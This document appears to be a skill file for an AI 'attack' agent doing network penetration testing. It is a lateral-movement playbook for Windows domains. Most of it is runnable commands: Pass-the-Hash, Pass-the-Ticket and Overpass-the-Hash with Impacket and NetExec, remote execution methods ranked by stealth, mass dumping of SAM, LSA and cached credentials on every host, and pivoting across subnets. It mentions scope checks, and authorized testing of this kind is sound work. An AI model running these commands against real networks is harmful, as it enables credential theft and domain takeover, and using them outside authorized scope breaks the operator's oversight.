---
name: lateral-movement
version: 1.0.0
description: Lateral movement techniques for Phase 4 — Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, remote execution methods ranked by stealth, credential harvesting per hop, VLAN pivoting, and session management
phase: 4
agent: attack
mitre: T1021, T1550, T1550.002, T1550.003, T1003, T1021.002, T1021.003, T1021.006
ocd_branch: "Admin"
---

# Lateral Movement — Phase 4 Reference

## Decision Tree

```
START (local admin on at least ONE host, OR domain creds with known paths)
  |
  v
What credential material do you have?
  |
  +---> NTLM hash ---------> Pass-the-Hash (PtH)
  |                           Choose execution method by stealth need
  |
  +---> Kerberos ticket ----> Pass-the-Ticket (PtT)
  |                           Export KRB5CCNAME, use -k -no-pass
  |
  +---> NTLM hash + want ---> Overpass-the-Hash
  |     Kerberos auth          getTGT → then PtT
  |
  +---> Plaintext password --> Direct auth (any method)
  |
  v
Choose execution method (ranked by stealth):
  1. wmiexec  (stealthiest — WMI, no service install)
  2. smbexec  (semi-stealth — service, no binary drop)
  3. atexec   (scheduled task — moderate noise)
  4. dcomexec (DCOM — moderate noise)
  5. psexec   (noisiest — drops binary, creates service)
  6. evil-winrm (if WinRM open — uses legitimate protocol)
  |
  v
On each compromised host:
  1. Harvest credentials (secretsdump)
  2. Check for new paths (sessions, cached creds)
  3. Assess pivot potential (new subnets reachable?)
  4. Repeat: move toward DA / high-value targets
```

## 1. Pass-the-Hash (T1550.002)

Use NTLM hash directly for authentication without knowing the plaintext
password. Works with any tool that supports NTLM auth.

```bash
# NetExec — test hash validity across multiple hosts
netexec smb loot/phase1/live_hosts.txt -u $USER -H $NTHASH \
  | tee -a loot/phase4/nxc_pth_spray_$USER.out

# NetExec — execute command via PtH
netexec smb $TARGET -u $USER -H $NTHASH -x "whoami /all" \
  | tee -a loot/phase4/nxc_pth_$TARGET.out

# wmiexec — stealthiest remote execution
wmiexec.py $DOMAIN/$USER@$TARGET -hashes :$NTHASH \
  | tee -a loot/phase4/wmiexec_$TARGET.out

# psexec — interactive shell (noisiest, leaves artifacts)
psexec.py $DOMAIN/$USER@$TARGET -hashes :$NTHASH \
  | tee -a loot/phase4/psexec_$TARGET.out
```

**Hash format notes:**
- Impacket expects `LMHASH:NTHASH` — if LM hash unavailable, use `:NTHASH` (empty LM)
- NetExec expects just the NT hash with `-H` flag
- Common hash: `aad3b435b51404eeaad3b435b51404ee:$NTHASH` (LM is AAD3... when disabled)

## 2. Pass-the-Ticket (T1550.003)

Use a Kerberos ticket (TGT or TGS) to authenticate. Avoids NTLM entirely,
which bypasses NTLM monitoring. Requires the .ccache file.

```bash
# Set Kerberos ticket cache
export KRB5CCNAME=/path/to/$USER.ccache

# Use ticket with Impacket tools
wmiexec.py $DOMAIN/$USER@$TARGET -k -no-pass \
  | tee -a loot/phase4/ptt_wmiexec_$TARGET.out

secretsdump.py $DOMAIN/$USER@$TARGET -k -no-pass \
  | tee -a loot/phase4/ptt_secretsdump_$TARGET.out

psexec.py $DOMAIN/$USER@$TARGET -k -no-pass \
  | tee -a loot/phase4/ptt_psexec_$TARGET.out

# evil-winrm with Kerberos
evil-winrm -i $TARGET -r $DOMAIN \
  | tee -a loot/phase4/ptt_evilwinrm_$TARGET.out
```

**Ticket requirements:**
- TGT (.ccache) — can request service tickets to any service
- TGS (.ccache) — limited to the specific service it was requested for
- Tickets expire (default: 10 hours TGT, 600 minutes TGS) — check `klist`

## 3. Overpass-the-Hash (T1550.002 variant)

Convert an NTLM hash into a Kerberos TGT. Useful when NTLM authentication
is blocked but Kerberos is available, or to avoid NTLM relay detection.

```bash
# Get TGT from NTLM hash
getTGT.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC \
  | tee -a loot/phase4/opth_gettgt_$USER.out

# Set the ticket
export KRB5CCNAME=$USER.ccache

# Now use Kerberos auth (same as PtT)
wmiexec.py $DOMAIN/$USER@$TARGET -k -no-pass \
  | tee -a loot/phase4/opth_wmiexec_$TARGET.out
```

## 4. Remote Execution Methods — Stealth Ranking

### wmiexec (Stealthiest)

Uses Windows Management Instrumentation. No service creation, no binary dropped.
Output retrieved via temporary file share.

```bash
wmiexec.py $DOMAIN/$USER:$PASS@$TARGET \
  | tee -a loot/phase4/wmiexec_$TARGET.out

# With hash
wmiexec.py $DOMAIN/$USER@$TARGET -hashes :$NTHASH \
  | tee -a loot/phase4/wmiexec_$TARGET.out
```

**Artifacts:** WMI event logs (4688), temporary output file on C$ share.

### smbexec (Semi-Stealth)

Creates a Windows service but does not drop a binary. Commands executed via
service image path. Slightly noisier than wmiexec.

```bash
smbexec.py $DOMAIN/$USER:$PASS@$TARGET \
  | tee -a loot/phase4/smbexec_$TARGET.out
```

**Artifacts:** Service creation event (7045), service start/stop events.

### atexec (Moderate)

Creates a scheduled task to execute commands. Self-cleans the task after execution.

```bash
atexec.py $DOMAIN/$USER:$PASS@$TARGET "whoami /all" \
  | tee -a loot/phase4/atexec_$TARGET.out
```

**Artifacts:** Scheduled task creation event (4698), task execution logs.

### dcomexec (Moderate)

Uses Distributed COM for remote execution. Multiple DCOM objects available.

```bash
dcomexec.py $DOMAIN/$USER:$PASS@$TARGET \
  | tee -a loot/phase4/dcomexec_$TARGET.out

# Specify DCOM object (MMC20, ShellWindows, ShellBrowserWindow)
dcomexec.py -object MMC20 $DOMAIN/$USER:$PASS@$TARGET \
  | tee -a loot/phase4/dcomexec_mmc20_$TARGET.out
```

### psexec (Noisiest)

Uploads a binary to ADMIN$ share, creates and starts a service. Most detectable
but most reliable. Use only when stealth is not a concern.

```bash
psexec.py $DOMAIN/$USER:$PASS@$TARGET \
  | tee -a loot/phase4/psexec_$TARGET.out
```

**Artifacts:** File write to ADMIN$ (binary), service creation (7045), process creation (4688).

### evil-winrm (WinRM — If Ports Open)

Uses legitimate Windows Remote Management protocol (5985 HTTP / 5986 HTTPS).
Blends with normal admin traffic. Requires WinRM to be enabled and accessible.

```bash
# Password auth
evil-winrm -i $TARGET -u $USER -p $PASS \
  | tee -a loot/phase4/evilwinrm_$TARGET.out

# Hash auth
evil-winrm -i $TARGET -u $USER -H $NTHASH \
  | tee -a loot/phase4/evilwinrm_$TARGET.out
```

## 5. Credential Harvesting Per Hop

On EVERY compromised host, immediately dump credentials before moving on.

```bash
# Full credential dump (SAM + LSA + cached domain creds + DPAPI)
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET \
  | tee -a loot/phase4/secretsdump_$TARGET.out

# Mass dump across admin hosts
netexec smb loot/phase4/admin_hosts.txt -u $USER -H $NTHASH \
  --sam | tee -a loot/phase4/nxc_sam_mass.out

netexec smb loot/phase4/admin_hosts.txt -u $USER -H $NTHASH \
  --lsa | tee -a loot/phase4/nxc_lsa_mass.out

# Check for logged-in sessions (credential harvesting opportunity)
netexec smb loot/phase4/admin_hosts.txt -u $USER -H $NTHASH \
  --sessions | tee -a loot/phase4/nxc_sessions.out
```

**After each dump:** Check if any new credentials unlock paths to higher-value targets.
Cross-reference with BloodHound attack paths.

## 6. VLAN/Subnet Pivoting

When a compromised host has interfaces on multiple VLANs or subnets, use it
as a pivot point to reach previously unreachable targets.

```bash
# Check network interfaces on compromised host (via remote exec)
wmiexec.py $DOMAIN/$USER@$TARGET -hashes :$NTHASH \
  -c "ipconfig /all" | tee -a loot/phase4/pivot_interfaces_$TARGET.out

# If new subnet discovered:
# 1. Log new subnet to ENGAGEMENT.md (Zero updates scope)
# 2. Validate new subnet is in-scope (check with operator if uncertain)
# 3. Run quick host discovery on new subnet via compromised host
wmiexec.py $DOMAIN/$USER@$TARGET -hashes :$NTHASH \
  -c "arp -a" | tee -a loot/phase4/pivot_arp_$TARGET.out
```

**Pivoting decision:** If new subnet contains DCs, CAs, or Tier 0 assets not
reachable from the Pi's native VLAN, pivoting is high-priority.

## 7. Session Management

Track all active sessions, compromised hosts, and available credentials.

**Maintain in `loot/phase4/session_tracker.md`:**
```markdown
| Host | IP | Method | User | Cred Type | Status |
|------|----|--------|------|-----------|--------|
| DC01 | 10.x.x.10 | wmiexec | svc_sql | NTLM hash | active |
| WS05 | 10.x.x.55 | evil-winrm | jsmith | plaintext | active |
```

**Session discipline:**
- Keep session count minimal (OPSEC + resource conservation)
- Close sessions on hosts fully harvested (no further value)
- Prefer re-authentication over persistent sessions
- Document every session opened and closed in loot

## Operational Notes

- Choose stealth over speed unless operator authorizes noisy techniques
- Every compromised host = new credential dump = potential new paths
- Always validate scope before pivoting to new subnets
- On Pi5: avoid running multiple simultaneous interactive sessions (RAM)
- Save all credentials to `loot/credentials/hashes/` with source host notation
- Context headers BEFORE every tee command (mandatory)
